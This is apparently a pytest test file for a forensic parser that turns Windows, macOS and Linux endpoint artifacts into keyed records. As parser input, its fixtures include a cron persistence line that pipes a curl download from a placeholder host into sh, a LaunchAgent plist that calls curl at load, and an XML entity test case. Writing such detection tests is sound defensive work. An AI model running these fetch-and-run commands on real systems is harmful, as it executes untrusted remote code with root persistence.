"""The endpoint-artifact parser: every format, the keys, the report. Run in the worker's image.

Every file is made here at test time: harmless text, never evidence.
"""

from __future__ import annotations

import io
import json
import os
import plistlib
import sqlite3
import sys

import pytest

HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, HERE)

from nik_forensics.context import Context  # noqa: E402
from nik_forensics.parsers import endpoint  # noqa: E402


def said(path: str, source: str, params: dict | None = None) -> list[dict]:
    out = io.BytesIO()
    endpoint.parse(path, Context(out, params or {"host": "WKS-1", "username": "alice"}), source)
    return [json.loads(line) for line in out.getvalue().splitlines() if line]


def write(tmp_path, name: str, data: bytes | str) -> str:
    path = tmp_path / name
    path.write_bytes(data if isinstance(data, bytes) else data.encode("utf-8"))
    return str(path)


def records(found: list[dict]) -> list[dict]:
    return [event for event in found if event["t"] == "r"]


def notes(found: list[dict]) -> dict[str, int]:
    return {event["reason"]: event["count"] for event in found if event["t"] == "note"}


def skips(found: list[dict]) -> list[dict]:
    return [event for event in found if event["t"] == "skip"]


def test_the_sources_are_the_ids_of_the_collection_tab():
    assert set(endpoint.SOURCES) == {
        "windows.execution.bam",
        "windows.persistence.runkeys",
        "windows.persistence.tasks",
        "windows.persistence.services",
        "windows.persistence.startup",
        "windows.persistence.wmi",
        "windows.usb.usbstor",
        "windows.usb.setupapi",
        "macos.execution.knowledgec",
        "macos.persistence.launch",
        "macos.persistence.cron",
        "linux.persistence.cron",
        "linux.persistence.sshkeys",
        "linux.persistence.rc",
        "linux.persistence.systemd",
        "linux.fileaccess.recent",
        "linux.usb.journal",
    }
    assert (endpoint.NAME, endpoint.VERSION, endpoint.KIND) == ("endpoint", "1", "endpoint")


# --------------------------------------------------------------------------- #
# CSV and JSON                                                                #
# --------------------------------------------------------------------------- #
RUNKEYS = (
    "\ufeffname,kind,command,location\r\n"
    'Updater,Run key,"C:\\Tools\\up.exe -q, now",HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\r\n'
    "OneDrive,Run key,C:\\od.exe,HKLM:\\Run\r\n"
    ",,,\r\n"
    'Updater,Run key,"C:\\Tools\\up.exe -q, now",HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\r\n'
)


def test_a_script_csv_gives_one_record_per_row_with_stable_keys_and_repeats(tmp_path):
    path = write(tmp_path, "persistence_runkeys.csv", RUNKEYS)
    found = said(path, "windows.persistence.runkeys")
    source, *rest = found
    assert (source["parser"], source["kind"], source["source"], source["host"], source["username"]) == (
        "endpoint",
        "endpoint",
        "windows.persistence.runkeys",
        "WKS-1",
        "alice",
    )
    recs = records(found)
    assert [r["type"] for r in recs] == ["runkeys"] * 3
    assert recs[0]["data"] == {
        "name": "Updater",
        "kind": "Run key",
        "command": "C:\\Tools\\up.exe -q, now",
        "location": "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        "category": "persistence",
        "os": "windows",
    }
    assert recs[0]["summary"] == "Updater — C:\\Tools\\up.exe -q, now"
    assert (recs[0]["host"], recs[0]["username"], recs[0]["ioc"]) == ("WKS-1", "alice", [])
    # The same row again is the same key with :2; the blank-valued row is a note, not a record.
    assert recs[2]["key"] == recs[0]["key"] + ":2" and recs[0]["key"] != recs[1]["key"]
    assert (
        recs[0]["key"].startswith("ep:WKS-1:windows.persistence.runkeys:") and len(recs[0]["key"].split(":")[-1]) == 16
    )
    assert [r["loc"] for r in recs] == [{"row": 1}, {"row": 2}, {"row": 3}]
    # A line of nothing but commas is a blank line, not a row.
    assert notes(found) == {"blank line": 1, "row without a usable time": 3}
    assert not skips(found)
    assert rest[-1]["in_file"] == 3 and rest[-1]["read"] == 3
    again = said(path, "windows.persistence.runkeys")
    assert [r["key"] for r in records(again)] == [r["key"] for r in recs]


def test_times_of_a_row_are_converted_or_the_row_keeps_no_time(tmp_path):
    csv_text = (
        "name,path,runCount,source,lastRun\n"
        "a.exe,C:\\a.exe,3,BAM,2024-05-01T10:00:00Z\n"
        "b.exe,C:\\b.exe,,BAM,1714557600\n"
        "c.exe,C:\\c.exe,,BAM,1714557600000\n"
        "d.exe,C:\\d.exe,,BAM,2024-05-01 10:00:00.1234567\n"
        "e.exe,C:\\e.exe,,BAM,when the moon was full\n"
        "f.exe,C:\\f.exe,,BAM,\n"
        "g.exe,C:\\g.exe,,BAM,13348000000000000\n"
    )
    found = said(write(tmp_path, "execution_bam.csv", csv_text), "windows.execution.bam")
    recs = records(found)
    assert [r["ts"] for r in recs[:4]] == [1714557600000, 1714557600000, 1714557600000, 1714557600123]
    assert recs[4]["ts"] is None and recs[5]["ts"] is None
    assert recs[6]["ts"] == 13348000000000 - 11644473600000  # microseconds since 1601
    assert recs[0]["data"] == {
        "name": "a.exe",
        "path": "C:\\a.exe",
        "runCount": "3",
        "source": "BAM",
        "category": "execution",
        "os": "windows",
    }
    assert recs[0]["summary"] == "a.exe — C:\\a.exe"
    assert notes(found) == {"row without a usable time": 2}  # a bad value and an empty one: kept, no time
    assert found[-1]["first_ts"] == recs[6]["ts"] and found[-1]["last_ts"] == 1714557600123


def test_a_csv_with_unknown_columns_is_a_skip_and_every_row_a_note(tmp_path):
    path = write(tmp_path, "x.csv", "alpha,beta\n1,2\n3,4\n")
    found = said(path, "windows.persistence.tasks")
    assert not records(found)
    (skip,) = skips(found)
    assert (skip["reason"], skip["lost"], skip["detail"]) == ("columns not recognised", 0, "alpha,beta")
    assert notes(found) == {"row without content": 2}
    assert found[-1]["in_file"] == 2 and found[-1]["read"] == 0
    # A header with nothing under it is still told.
    only_header = said(write(tmp_path, "h.csv", "alpha,beta\n"), "windows.persistence.tasks")
    assert skips(only_header)[0]["reason"] == "columns not recognised" and only_header[-1]["in_file"] == 0


def test_a_json_export_is_read_as_array_or_as_an_object_with_rows(tmp_path):
    rows = [
        {
            "Device": "Kingston DT",
            "SerialNumber": "0123",
            "Vendor": "Kingston",
            "Connection": "USBSTOR",
            "Time": 1714557600,
        },
        {"device": "Other", "serial": "9"},
        "not a row",
        {"unrelated": "x"},
        {"device": "Third", "time": "garbage"},
    ]
    for name, document in (("a.json", rows), ("b.json", {"records": rows})):
        found = said(write(tmp_path, name, json.dumps(document)), "windows.usb.usbstor")
        recs = records(found)
        assert [r["data"]["device"] for r in recs] == ["Kingston DT", "Other", "Third"]
        assert recs[0]["data"]["serial"] == "0123" and recs[0]["ts"] == 1714557600000
        assert recs[0]["summary"] == "Kingston DT — 0123"
        assert [r["loc"] for r in recs] == [{"row": 1}, {"row": 2}, {"row": 5}]
        (skip,) = skips(found)
        assert (skip["reason"], skip["lost"]) == ("row cannot be read", 1) and "row 3" in skip["detail"]
        assert notes(found) == {"row without content": 1, "row without a usable time": 2}
        # in_file = array length = read + noted + lost
        assert found[-1]["in_file"] == 5 and found[-1]["read"] + 1 + 1 == 5


def test_json_that_is_not_json_or_has_no_rows_is_said(tmp_path):
    bad = said(write(tmp_path, "bad.json", '[{"name": '), "windows.persistence.wmi")
    assert skips(bad)[0]["reason"] == "not valid JSON" and bad[-1]["in_file"] is None and not records(bad)
    none = said(write(tmp_path, "obj.json", '{"count": 3}'), "windows.persistence.wmi")
    assert skips(none)[0]["reason"] == "no rows found" and "count" in skips(none)[0]["detail"]
    empty = said(write(tmp_path, "e.csv", "  \n"), "windows.persistence.wmi")
    assert not records(empty) and empty[-1]["in_file"] == 0


def test_a_json_file_over_the_limit_is_not_read_whole(tmp_path, monkeypatch):
    monkeypatch.setattr(endpoint, "MAX_WHOLE", 10)
    found = said(write(tmp_path, "big.json", '[{"name": "a"}]'), "windows.persistence.wmi")
    assert skips(found)[0]["reason"] == "file too large to read whole" and found[-1]["in_file"] is None


def test_a_utf16_csv_and_bytes_that_are_not_utf8_are_read(tmp_path):
    data = "name,kind,command,location\nTask,Scheduled Task,cmd /c x,\\\n".encode("utf-16")
    recs = records(said(write(tmp_path, "u16.csv", data), "windows.persistence.tasks"))
    assert [r["data"]["name"] for r in recs] == ["Task"]
    found = said(write(tmp_path, "bad.csv", b"name,command\nbad\xff,x\n"), "windows.persistence.tasks")
    assert records(found)[0]["data"]["name"] == "bad\ufffd"
    assert notes(found)["row with bytes that are not UTF-8"] == 1


def test_a_row_longer_than_the_header_and_blank_lines_are_noted(tmp_path):
    found = said(write(tmp_path, "w.csv", "name,command\na,b,c\n\nd,e\n"), "linux.persistence.systemd")
    assert [r["data"]["command"] for r in records(found)] == ["b", "e"]
    assert notes(found) == {"blank line": 1, "row with more cells than the header": 1, "row without a usable time": 2}
    assert found[-1]["in_file"] == 2


# --------------------------------------------------------------------------- #
# Line files, XBEL, plist                                                     #
# --------------------------------------------------------------------------- #
def test_cron_lines_are_records_and_comments_are_notes(tmp_path):
    job = b"*/5 * * * * root curl http://example.test/x | sh\n"
    data = b"# m h dom mon dow\nSHELL=/bin/sh\n\n" + job + job
    path = write(tmp_path, "crontab", data)
    found = said(path, "linux.persistence.cron")
    recs = records(found)
    assert len(recs) == 3 and all(r["type"] == "cron" and r["ts"] is None for r in recs)
    assert recs[1]["data"] == {
        "name": "cron entry",
        "kind": "cron",
        "command": "*/5 * * * * root curl http://example.test/x | sh",
        "location": "cron",
        "category": "persistence",
        "os": "linux",
    }
    assert recs[2]["key"] == recs[1]["key"] + ":2"
    assert recs[1]["loc"]["line"] == 4 and data[recs[1]["loc"]["offset"] :].startswith(b"*/5")
    assert notes(found) == {"comment or blank line": 2, "no time": 3}
    assert found[-1]["in_file"] == 3
    # The same lines under the macOS source: its own keys.
    mac = said(path, "macos.persistence.cron")
    assert records(mac)[0]["key"] != recs[0]["key"]
    keys = said(write(tmp_path, "authorized_keys", b"ssh-ed25519 AAAAC3Nza test@host\n"), "linux.persistence.sshkeys")
    assert (
        records(keys)[0]["data"]["kind"] == "authorized_keys" and records(keys)[0]["data"]["name"] == "authorized_key"
    )
    rc = said(write(tmp_path, ".bashrc", b"alias ll='ls -l'\n"), "linux.persistence.rc")
    assert records(rc)[0]["data"]["location"] == "shell rc / profile"


def test_a_line_longer_than_a_megabyte_is_a_skip_not_a_record(tmp_path):
    found = said(write(tmp_path, "rc", b"x" * (1024 * 1024 + 10) + b"\nls\n"), "linux.persistence.rc")
    assert len(records(found)) == 1 and skips(found)[0]["lost"] == 1 and found[-1]["in_file"] == 2


XBEL = """<?xml version="1.0" encoding="UTF-8"?>
<xbel version="1.0" xmlns:bookmark="http://www.freedesktop.org/standards/desktop-bookmarks">
  <bookmark href="file:///home/a/My%20Docs/plan.odt" added="2024-05-01T09:00:00Z"
            modified="2024-05-01T10:00:00Z" visited="2024-05-01T11:00:00Z">
    <info><metadata owner="x"><bookmark:applications>
      <bookmark:application name="LibreOffice"/></bookmark:applications></metadata></info>
  </bookmark>
  <bookmark href="file:///tmp/payload.sh" visited="not a time"/>
  <bookmark/>
</xbel>
"""


def test_an_xbel_gives_one_record_per_bookmark(tmp_path):
    path = write(tmp_path, "recently-used.xbel", XBEL)
    assert endpoint.sniff(path, "recently-used.xbel", XBEL.encode()[:4096]) == "linux.fileaccess.recent"
    found = said(path, "linux.fileaccess.recent")
    recs = records(found)
    assert [r["data"] for r in recs] == [
        {
            "name": "plan.odt",
            "target": "/home/a/My Docs/plan.odt",
            "kind": "recently-used",
            "category": "fileaccess",
            "os": "linux",
        },
        {
            "name": "payload.sh",
            "target": "/tmp/payload.sh",
            "kind": "recently-used",
            "category": "fileaccess",
            "os": "linux",
        },
    ]
    assert [r["ts"] for r in recs] == [1714557600000, None] and recs[0][
        "summary"
    ] == "plan.odt — /home/a/My Docs/plan.odt"
    assert recs[0]["loc"]["line"] == 3
    assert notes(found) == {"row without content": 1, "row without a usable time": 1}
    assert found[-1]["in_file"] == 3


def test_an_xml_with_entities_or_that_breaks_is_not_read_on(tmp_path):
    bomb = '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY a "aaaa">]><xbel><bookmark href="file:///&a;"/></xbel>'
    with pytest.raises(ValueError):
        said(write(tmp_path, "bomb.xbel", bomb), "linux.fileaccess.recent")
    out = io.BytesIO()
    ctx = Context(out)
    with pytest.raises(ValueError):
        endpoint.parse(
            write(tmp_path, "cut.xbel", '<xbel><bookmark href="file:///a"/><bookmark href="file:///b'),
            ctx,
            "linux.fileaccess.recent",
        )
    lines = [json.loads(line) for line in out.getvalue().splitlines()]
    assert [e["t"] for e in lines] == ["source", "r", "skip"] and lines[-1]["lost"] == 0


def test_a_plist_gives_a_launch_item_from_xml_and_from_binary(tmp_path):
    item = {
        "Label": "com.example.agent",
        "ProgramArguments": ["/usr/bin/curl", "-s", "http://example.test"],
        "RunAtLoad": True,
    }
    for fmt in (plistlib.FMT_XML, plistlib.FMT_BINARY):
        path = write(tmp_path, f"a{fmt.value}.plist", plistlib.dumps(item, fmt=fmt))
        assert endpoint.sniff(path, "a.plist", open(path, "rb").read(4096)) == "macos.persistence.launch"
        found = said(path, "macos.persistence.launch")
        (rec,) = records(found)
        assert rec["data"] == {
            "name": "com.example.agent",
            "kind": "LaunchAgent",
            "command": "/usr/bin/curl -s http://example.test",
            "location": "LaunchAgent / LaunchDaemon",
            "category": "persistence",
            "os": "macos",
        }
        assert rec["loc"] == {"path": "ProgramArguments"} and rec["ts"] is None
        assert found[-1]["in_file"] == 1 and notes(found) == {"no time": 1}
    program = said(
        write(tmp_path, "p.plist", plistlib.dumps({"Label": "x", "Program": "/bin/x"})), "macos.persistence.launch"
    )
    assert records(program)[0]["data"]["command"] == "/bin/x" and records(program)[0]["loc"] == {"path": "Program"}
    wrong = said(write(tmp_path, "w.plist", plistlib.dumps({"CFBundleName": "x"})), "macos.persistence.launch")
    assert not records(wrong) and skips(wrong)[0]["lost"] == 1 and wrong[-1]["in_file"] == 1
    junk = said(write(tmp_path, "j.plist", b"not a plist"), "macos.persistence.launch")
    assert skips(junk)[0]["reason"] == "not a valid plist" and junk[-1]["in_file"] is None


# --------------------------------------------------------------------------- #
# setupapi, KnowledgeC                                                        #
# --------------------------------------------------------------------------- #
SETUPAPI = """[Device Install Log]
     OS Version = 10.0.19045
     Service Pack = 0.0

[BeginLog]

[Boot Session: 2024/05/01 08:00:00.000]

>>>  [Device Install (Hardware initiated) - USBSTOR\\Disk&Ven_Kingston&Prod_DT&Rev_1.00\\0123456789&0]
>>>  Section start 2024/05/01 10:23:45.123
     cmd: C:\\Windows\\system32\\svchost.exe
<<<  Section end 2024/05/01 10:23:46.000

>>>  [Device Install (DiFx) - PCI\\VEN_8086&DEV_1234\\3&11583659&0&FA]
>>>  Section start 2024/05/01 10:24:00.000

>>>  [Device Install (Hardware initiated) - USB\\VID_0781&PID_5567\\20060876CE]
     no time follows in these lines
     nor here
     nor here
     nor here
"""


def test_a_setupapi_log_gives_the_usb_sections_with_their_times(tmp_path):
    path = write(tmp_path, "setupapi.dev.log", SETUPAPI)
    assert endpoint.sniff(path, "setupapi.dev.log", SETUPAPI.encode()[:4096]) == "windows.usb.setupapi"
    found = said(path, "windows.usb.setupapi")
    recs = records(found)
    assert [r["data"]["device"] for r in recs] == [
        "USBSTOR\\Disk&Ven_Kingston&Prod_DT&Rev_1.00\\0123456789&0",
        "USB\\VID_0781&PID_5567\\20060876CE",
    ]
    assert [r["data"]["serial"] for r in recs] == ["0123456789&0", "20060876CE"]
    assert recs[0]["data"]["connection"] == "setupapi" and recs[0]["data"]["vendor"] == ""
    assert [r["ts"] for r in recs] == [1714559025123, None]
    assert [r["loc"]["line"] for r in recs] == [9, 17]
    assert recs[0]["summary"].endswith("— 0123456789&0")
    assert notes(found) == {
        "device install that is not a USB device": 1,
        "time is the host's local time": 1,
        "row without a usable time": 1,
    }
    assert found[-1]["in_file"] == 2


def _knowledgec(path: str, rows: list[tuple], extra_table: bool = True) -> None:
    conn = sqlite3.connect(path)
    conn.execute(
        "CREATE TABLE ZOBJECT (Z_PK INTEGER PRIMARY KEY, ZSTREAMNAME TEXT, ZVALUESTRING TEXT, ZSTARTDATE REAL)"
    )
    conn.executemany("INSERT INTO ZOBJECT (ZSTREAMNAME, ZVALUESTRING, ZSTARTDATE) VALUES (?, ?, ?)", rows)
    conn.commit()
    conn.close()


def test_knowledgec_gives_the_app_usage_rows_with_their_rowids(tmp_path):
    path = str(tmp_path / "knowledgeC.db")
    _knowledgec(
        path,
        [
            ("/app/usage", "com.apple.Terminal", 736000000.0),  # 2024-05-01 in Mac absolute time
            ("/app/usage", "com.example.Tool", None),
            ("/app/usage", None, 736000100.0),
            ("/app/webUsage", "example.test", 736000200.0),
            ("/app/usage", "com.apple.Terminal", 736000000.0),
        ],
    )
    assert endpoint.sniff(path, "knowledgeC.db", open(path, "rb").read(4096)) == "macos.execution.knowledgec"
    found = said(path, "macos.execution.knowledgec")
    recs = records(found)
    assert [r["data"]["name"] for r in recs] == ["com.apple.Terminal", "com.example.Tool", "com.apple.Terminal"]
    assert recs[0]["data"] == {
        "name": "com.apple.Terminal",
        "path": "com.apple.Terminal",
        "runCount": "",
        "source": "KnowledgeC",
        "category": "execution",
        "os": "macos",
    }
    assert recs[0]["ts"] == (736000000 + 978307200) * 1000 and recs[1]["ts"] is None
    assert [r["loc"] for r in recs] == [
        {"table": "ZOBJECT", "rowid": 1},
        {"table": "ZOBJECT", "rowid": 2},
        {"table": "ZOBJECT", "rowid": 5},
    ]
    assert recs[2]["key"] == recs[0]["key"] + ":2"
    assert notes(found) == {"row without content": 1, "row without a usable time": 1, "rows of other streams": 1}
    assert found[-1]["in_file"] == 4 and found[-1]["read"] == 3
    assert [r["key"] for r in records(said(path, "macos.execution.knowledgec"))] == [r["key"] for r in recs]
    # The file is not changed by the read (no journal, no write).
    assert sorted(os.listdir(tmp_path)) == ["knowledgeC.db"]


def test_a_database_without_the_table_or_that_is_not_one_is_a_skip(tmp_path):
    other = str(tmp_path / "other.db")
    conn = sqlite3.connect(other)
    conn.execute("CREATE TABLE t (a)")
    conn.commit()
    conn.close()
    assert endpoint.sniff(other, "other.db", open(other, "rb").read(4096)) is None
    found = said(other, "macos.execution.knowledgec")
    assert skips(found)[0]["reason"] == "table missing" and found[-1]["in_file"] is None
    junk = said(
        write(tmp_path, "junk.db", b"this is not a database at all, but it is long enough"),
        "macos.execution.knowledgec",
    )
    assert skips(junk)[0]["lost"] == 0 and junk[-1]["in_file"] is None


def test_sniff_tells_only_what_the_file_says(tmp_path):
    csv_path = write(tmp_path, "persistence_runkeys.csv", RUNKEYS)
    assert endpoint.sniff(csv_path, "persistence_runkeys.csv", RUNKEYS.encode()[:4096]) is None
    assert endpoint.sniff(csv_path, "x.json", b'[{"name": "a"}]') is None
    plain = write(tmp_path, "plain.plist", plistlib.dumps({"CFBundleName": "x"}))
    assert endpoint.sniff(plain, "plain.plist", open(plain, "rb").read()) is None
    with pytest.raises(ValueError):
        said(csv_path, "windows.nothing.here")


def test_the_key_holds_the_time_so_one_app_at_two_times_has_two_keys(tmp_path):
    path = str(tmp_path / "knowledgeC.db")
    _knowledgec(
        path,
        [
            ("/app/usage", "com.apple.Terminal", 736000000.0),
            ("/app/usage", "com.apple.Terminal", 736000500.0),
            ("/app/usage", "com.apple.Terminal", 736000500.0),
        ],
    )
    keys = [r["key"] for r in records(said(path, "macos.execution.knowledgec"))]
    assert keys[1] != keys[0] and not keys[0].count(":") > 3 and keys[2] == keys[1] + ":2"
    csv_path = write(tmp_path, "a.csv", "name,path,lastRun\na.exe,C:\a.exe,1714557600\na.exe,C:\a.exe,1714557700\n")
    csv_keys = [r["key"] for r in records(said(csv_path, "windows.execution.bam"))]
    assert csv_keys[0] != csv_keys[1] and all(len(k.split(":")[-1]) == 16 for k in csv_keys)


def test_a_wal_database_is_said_and_the_file_name_is_the_location_of_a_line_file(tmp_path):
    path = str(tmp_path / "knowledgeC.db")
    _knowledgec(path, [("/app/usage", "com.apple.Terminal", 736000000.0)])
    conn = sqlite3.connect(path)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.close()
    found = said(path, "macos.execution.knowledgec")
    assert notes(found)["database in WAL mode"] == 1 and len(records(found)) == 1
    cron = write(tmp_path, "root", b"* * * * * root id\n")
    named = said(cron, "linux.persistence.cron", {"host": "H", "file_name": "/var/spool/cron/root"})
    assert records(named)[0]["data"]["location"] == "/var/spool/cron/root"
    assert records(said(cron, "linux.persistence.cron"))[0]["data"]["location"] == "cron"
